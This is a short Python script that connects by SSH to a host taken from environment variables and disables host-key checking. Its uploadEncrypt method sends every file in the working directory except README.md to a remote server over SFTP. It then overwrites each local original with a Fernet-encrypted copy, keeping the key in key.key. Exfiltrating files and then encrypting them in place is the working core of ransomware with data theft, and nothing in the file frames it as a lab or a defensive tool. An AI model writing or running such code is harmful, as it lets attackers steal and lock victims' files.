import paramiko
import os
from dotenv import load_dotenv
from cryptography.fernet import Fernet

load_dotenv()

class SFTP():
    def __init__(self):
        self.host = os.getenv("HOST")
        self.user = os.getenv("USERNAME")
        self.password = os.getenv("PASSWORD")
        self.localpath = os.getenv("LOCALPATH")
        self.remotepath = os.getenv("REMOTEPATH")
        self.ssh_client =paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.ssh_client.connect(hostname = self.host, username = self.user, password = self.password)

    def run(self):
        stdin, stdout, stderr = self.ssh_client.exec_command("ls")

    def uploadEncrypt(self):
        key = Fernet.generate_key()
        with open("key.key", "wb") as keyfile:
            keyfile.write(key)
        files = []
        for file in os.listdir():
            if os.path.isfile(file):
                if file == "README.md":
                    continue
                files.append(file)

        #open an sftp connection to my remote client
        ftp_client = self.ssh_client.open_sftp()

        #this will send the file to the server and then encrypt the file
        for eachfile in files:
            ftp_client.put(eachfile, f"{self.remotepath}/{eachfile}")
            #after successfully sending the file to server encrypt the file using the key file sent
            with open(eachfile, "rb") as file:
                contents = file.read()
            contents_encrypted  = Fernet(key).encrypt(contents)
            with open(eachfile,"wb") as file:
                file.write(contents_encrypted)

        #finally close the ftp connection to the remote host
        ftp_client.close()

